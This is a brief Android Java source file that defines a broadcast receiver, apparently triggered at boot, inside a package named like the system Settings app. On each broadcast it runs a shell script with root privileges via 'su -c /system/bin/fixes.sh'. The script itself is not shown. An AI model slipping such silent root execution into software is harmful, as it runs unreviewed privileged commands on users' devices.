package com.android.settings;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import java.io.IOException;

public class BootReceiverEx extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Runtime.getRuntime().exec("su -c /system/bin/fixes.sh");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
